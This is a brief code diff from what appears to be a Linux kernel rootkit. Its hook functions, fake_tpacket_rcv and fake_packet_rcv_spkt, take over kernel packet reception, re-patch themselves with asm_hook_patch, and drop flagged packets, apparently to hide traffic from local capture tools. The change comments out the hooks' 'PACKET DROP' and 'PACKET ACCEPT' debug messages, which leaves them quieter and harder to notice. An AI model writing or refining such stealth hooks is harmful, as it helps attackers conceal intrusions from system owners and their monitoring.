@@ -1031,7 +1031,7 @@ int fake_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
 	inc_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
 
 	if(packet_check(skb)) {
-		debug("PACKET DROP");
+		//debug("PACKET DROP");
 		dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
 		return NF_DROP;
 	}
@@ -1050,7 +1050,7 @@ int fake_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
 	asm_hook_patch(fake_tpacket_rcv);
 
 	dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
-	debug("PACKET ACCEPT");
+	//debug("PACKET ACCEPT");
 
 	return ret;
 }
@@ -1064,7 +1064,7 @@ int fake_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev,
 	inc_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
 
 	if(packet_check(skb)) {
-		debug("PACKET DROP");
+		//debug("PACKET DROP");
 		dec_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
 		return NF_DROP;
 	}
@@ -1083,7 +1083,7 @@ int fake_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev,
 	
 
 	dec_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
-	debug("PACKET ACCEPT");
+	//debug("PACKET ACCEPT");
 
 	return ret;
 }
